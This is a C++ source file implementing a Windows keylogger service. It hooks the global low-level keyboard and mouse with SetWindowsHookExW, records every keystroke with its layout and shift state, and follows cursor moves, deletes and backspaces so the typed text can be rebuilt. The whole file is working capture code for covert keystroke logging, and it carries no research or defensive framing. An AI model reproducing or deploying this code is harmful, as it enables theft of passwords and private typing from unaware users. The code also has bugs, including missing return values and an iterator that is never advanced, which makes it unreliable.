#include "services.h"

bool services::keylogger::run()
{
	if (hhkLowLevelKybd == NULL)
	{
		hhkLowLevelKybd = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, NULL);
	}
	if (hhkLowLevelMouse == NULL)
	{
		hhkLowLevelMouse = SetWindowsHookExW(WH_MOUSE_LL, LowLevelMouseProc, NULL, NULL);
	}

	clear();
	isRunning = true;
}

bool services::keylogger::stop()
{
	if (hhkLowLevelKybd != NULL)
	{
		UnhookWindowsHookEx(hhkLowLevelKybd);
		hhkLowLevelKybd = NULL;
	}
	if (hhkLowLevelMouse != NULL)
	{
		UnhookWindowsHookEx(hhkLowLevelMouse);
		hhkLowLevelMouse = NULL;
	}

	isRunning = false;
}

void services::keylogger::processVirtualKey(VirtualKeyInfo vkInfo)
{
	// Filter virtual-key repeats
	if (vkcmp(vkInfo, lastKeyPressed))
	{
		if (vkRepeats != KEYLOGGER_MAX_REPEATS)
		{
			vkRepeats++;
		}
		else
		{
			return;
		}
	}
	else
	{
		vkRepeats = 0;
		lastKeyPressed = vkInfo;
	}

	//
	// TODO: Perform range checks before inserting info vkList
	//

	VirtualKeyInfoList::iterator it = vkList.begin();
	std::advance(vkList.begin(), vkListCursor);

	// Insert virtual-key into vkList at cursor position
	vkList.insert(it, vkInfo);
}

void services::keylogger::onDelete()
{
	if (vkListCursor >= 0 && vkListCursor < vkList.size())
	{
		VirtualKeyInfoList::iterator it = vkList.begin();
		std::advance(it, vkListCursor);
		vkList.erase(it);
	}
}

void services::keylogger::onBackspace()
{
	if (vkListCursor > 0 && vkListCursor < vkList.size() + 1)
	{
		VirtualKeyInfoList::iterator it = vkList.begin();
		std::advance(it, vkListCursor - 1);
		vkList.erase(it);
		vkListCursor--;
	}
}

void services::keylogger::clear()
{
	vkRepeats = 0;
	vkListCursor = 0;
	lastKeyPressed.vkCode = 0;
	lastKeyPressed.lang = 0;
	lastKeyPressed.flags = 0;
	vkList.clear();
}

inline bool services::keylogger::vkcmp(VirtualKeyInfo vk1, VirtualKeyInfo vk2)
{
	return (vk1.vkCode == vk2.vkCode && vk1.lang == vk2.lang && vk1.flags == vk2.flags);
}

LRESULT CALLBACK services::keylogger::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (wParam == WM_KEYDOWN)
	{
		KBDLLHOOKSTRUCT* dllHookStruct = (KBDLLHOOKSTRUCT*)lParam;

		switch (dllHookStruct->vkCode)
		{
		case VK_UP:
			// Point cursor to the start
			vkListCursor = 0;
			break;
		case VK_DOWN:
			// Point cursor to the end
			vkListCursor = vkList.size() + 1;
			break;
		case VK_LEFT:
			// Shift virtual-key cursor to left if cursor isn't at begining
			if (vkListCursor > 0)
			{
				vkListCursor--;
			}
			break;
		case VK_RIGHT:
			// Shift virtual-key cursor to right if cursor isn't at end
			if (vkListCursor < vkList.size())
			{
				vkListCursor++;
			}
			break;
		}

		bool isShift = GetKeyState(VK_SHIFT) & 0x8000;
		bool isCapsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

		VirtualKeyInfo vkInfo;
		vkInfo.vkCode = dllHookStruct->vkCode;
		vkInfo.lang = WORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
		vkInfo.flags = isShift && isCapsLock ? 0x3 : isShift ? 0x1 : isCapsLock ? 0x2 : 0x0;

		processVirtualKey(vkInfo);
	}

	return CallNextHookEx(hhkLowLevelKybd, nCode, wParam, lParam);
}

LRESULT CALLBACK services::keylogger::LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION)
	{
		switch (wParam)
		{
		case WM_LBUTTONDOWN:
			// Left mouse button down
			break;
		case WM_RBUTTONDOWN:
			// Right mouse button down
			break;
		}
	}

	return CallNextHookEx(hhkLowLevelMouse, nCode, wParam, lParam);
}